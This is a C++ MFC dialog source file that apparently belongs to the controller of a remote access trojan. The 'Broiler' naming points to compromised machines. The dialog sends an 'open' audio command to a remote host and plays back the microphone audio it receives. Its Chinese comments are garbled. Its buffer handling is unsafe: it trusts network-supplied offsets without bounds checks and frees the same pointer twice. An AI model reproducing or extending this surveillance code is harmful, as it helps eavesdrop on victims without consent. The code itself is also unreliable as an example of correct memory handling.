// AudioDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Client.h"
#include "AudioDlg.h"
#include "BroilerData.h"

// CAudioDlg �Ի���

IMPLEMENT_DYNAMIC(CAudioDlg, CDialog)

CAudioDlg::CAudioDlg(CWnd* pParent /*=NULL*/, SOCKET sock)
	: CDialog(CAudioDlg::IDD, pParent)
{
	m_socket = sock;
	m_pData = NULL;
}

CAudioDlg::~CAudioDlg()
{
}

void CAudioDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CAudioDlg, CDialog)
END_MESSAGE_MAP()


// CAudioDlg ��Ϣ�������
BOOL CAudioDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: �ڴ����ר�ô����/����û���
	if ( WM_KEYDOWN == pMsg->message)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (VK_RETURN == nVirtKey || VK_ESCAPE == nVirtKey)  //������µ��ǻس�����ESC������ض���Ϣ
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

BOOL CAudioDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
    SetIcon(AfxGetApp()->LoadIcon(IDI_ICON_AUDIO), FALSE);	
	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
    DlgInit();
	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}

void CAudioDlg::DlgInit()
{
	CString strTitle = _T("");
	strTitle.Format(_T("\\\\%s - ��������"), m_strIP);
	SetWindowText(strTitle);

	// ֪ͨԶ�̿��ƶ˶Ի����Ѿ���
	char strMsg[] = "open";  //�����߳�
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_AUDIO;
	memcpy((char*)tagMsgInfo.context, (char*)strMsg, sizeof(strMsg));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
    //�������ͱ��������Ĺ����߳�
	m_hWorkThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThreadProc, (LPVOID)this, 0, NULL);
}

DWORD WINAPI CAudioDlg::WorkThreadProc( LPVOID lpParameter )
{
	return 0;
}

DWORD CAudioDlg::RecvAudioData(IN AUDIODATA_C tagAudioData)
{
	switch (tagAudioData.Id)
	{
	case 0:   //ͷ��Ϣ
		{
			m_pData = new BYTE[tagAudioData.dwSize];  //����ռ�
			memset(m_pData, 0, tagAudioData.dwSize);
		}
		break;
	case 1:  //������С���ݿ�
		{
			//��������
			for(int i= tagAudioData.Begin, j = 0 ; j < AUDIO_BUF_SIZE; i++, j++)
			{
				m_pData[i] = tagAudioData.Data[j];
			}
		}
		break;
	case 2:  //���һ�θ�������
		{
			for(int i= tagAudioData.Begin, j=0; i < tagAudioData.dwSize; i++,j++)
			{
				m_pData[i] = tagAudioData.Data[j];
			}
		}
		break;
	default:
		{
			MessageBox(_T("δ֪����������ID"),_T("��ʾ"),MB_OK);
			delete[] m_pData;
			LocalFree(m_pData);
			return 1;
		}
	}
	//�жϴ������Ժ��Ƿ���Բ�������
	if (tagAudioData.bRead)
	{
		m_Audio.playBuffer(m_pData, tagAudioData.dwSize);
		delete [] m_pData;
	}
	return 0;
}

DWORD WINAPI CAudioDlg::RecvAudioProc( LPVOID lpParameter )
{
	return 0;
}

void CAudioDlg::OnCancel()
{
	// TODO: �ڴ����ר�ô����/����û���
	DestroyWindow();
	delete this;
}

void CAudioDlg::PostNcDestroy()
{
	// TODO: �ڴ����ר�ô����/����û���
	CDialog::PostNcDestroy();
	((CBroilerData*)this->m_pParentWnd)->m_pAudioDlg = NULL; 
}
